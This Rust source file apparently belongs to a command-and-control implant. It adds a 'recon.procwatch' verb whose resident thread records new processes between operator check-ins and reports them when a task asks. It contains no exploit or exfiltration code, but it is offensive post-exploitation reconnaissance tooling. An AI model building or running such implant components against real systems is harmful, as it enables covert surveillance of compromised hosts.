//! The extension half of procwatch (ADR-022): a resident process-create
//! watch, the implant-native tier's first real entry. The sources land
//! inside the implant crate, so the watch runs as the implant's own
//! thread -- which is the whole point: the buffer accrues between
//! check-ins, a span no loadable plugin tier spans (an exec-v1 module is
//! a fresh process per dispatch, with no memory of the interval), and
//! the verb answers through the generated registry's one-call contract.
//!
//! The grammar is one bare read: `recon.procwatch` flushes the creation
//! rows since the previous ask and the next ask starts from there. The
//! first dispatch starts the watch -- its baseline snapshot is the
//! process table as it already sits, and only later starts become rows.

use crate::handlers::{HandlerOutput, Outcome};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

mod collect;
mod table;

/// How long the sampler sleeps between sweeps. Two seconds keeps the
/// watch's own cost negligible while holding the gap between a short
/// process's start and exit to one cadence period.
const CADENCE: Duration = Duration::from_secs(2);

/// The watch's whole state, behind one lock the sampler thread and the
/// verb's dispatch both take. A poisoned lock means a panic in the
/// sampler -- the watch keeps answering with what it holds rather than
/// dying with the verb.
struct Watch {
    ring: table::Ring,
    seen: Vec<table::Entry>,
    next_seq: u64,
    next_flush: u64,
}

static WATCH: OnceLock<Mutex<Option<Watch>>> = OnceLock::new();

fn watch() -> &'static Mutex<Option<Watch>> {
    WATCH.get_or_init(|| Mutex::new(None))
}

/// The extension's one-call contract: the generated registry hands each
/// verb the package declares to this function.
pub fn rod_extension(verb: &str, arguments: &str) -> HandlerOutput {
    match verb {
        "recon.procwatch" => procwatch(arguments),
        other => HandlerOutput {
            outcome: Outcome::Failed,
            output: format!("{other}: no such extension verb"),
            artifact: None,
        },
    }
}

fn procwatch(arguments: &str) -> HandlerOutput {
    if !arguments.trim().is_empty() {
        return HandlerOutput {
            outcome: Outcome::Failed,
            output: format!(
                "recon.procwatch: a bare task reads the rows since the last ask; \
                 the verb takes no arguments (got '{arguments}')"
            ),
            artifact: None,
        };
    }

    let started = ensure_watching();
    let output = {
        let mut guard = watch()
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner());
        let state = guard.as_mut().expect("ensure_watching installed the watch");
        let mut lines = Vec::new();
        // Eviction outran a silent span of no asks: say what was lost
        // rather than presenting a seamless window.
        if let Some(oldest) = state.ring.oldest_seq() {
            if oldest > state.next_flush {
                lines.push(format!(
                    "recon.procwatch: the buffer evicted rows {}..{oldest} \
                     before they were asked for",
                    state.next_flush
                ));
            }
        }
        lines.extend(state.ring.take_since(state.next_flush));
        state.next_flush = state.next_seq;
        if lines.is_empty() && started {
            "the watch started: the table as it already sits is the baseline, \
             and only later starts become rows -- ask again"
                .to_string()
        } else if lines.is_empty() {
            "no process creations since the last ask".to_string()
        } else {
            lines.join("\n")
        }
    };

    HandlerOutput {
        outcome: Outcome::Succeeded,
        output,
        artifact: None,
    }
}

/// Starts the watch on first ask: the baseline snapshot becomes what
/// `seen` holds, and the sampler thread diffs every later sweep against
/// it. Returns whether this call was the one that started the watch.
fn ensure_watching() -> bool {
    let mut guard = watch()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    if guard.is_some() {
        return false;
    }
    *guard = Some(Watch {
        ring: table::Ring::new(),
        seen: collect::snapshot(),
        next_seq: 0,
        next_flush: 0,
    });
    drop(guard);

    std::thread::Builder::new()
        .spawn(sampler)
        .expect("recon.procwatch: the sampler thread spawns");
    true
}

/// The resident sweep: snapshot, diff against the previous snapshot,
/// record the creations, sleep one cadence period, repeat for the life
/// of the process. A snapshot that fails reads as empty -- the next
/// sweep's diff then reports a start for everything that survived the
/// gap, the honest answer for a table that could not be read.
fn sampler() {
    loop {
        std::thread::sleep(CADENCE);
        let current = collect::snapshot();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|since| since.as_secs())
            .unwrap_or_default();
        let mut guard = watch()
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner());
        let Some(state) = guard.as_mut() else {
            continue;
        };
        for entry in table::creations(&state.seen, &current) {
            state.ring.push_creation(&mut state.next_seq, &entry, now);
        }
        state.seen = current;
    }
}
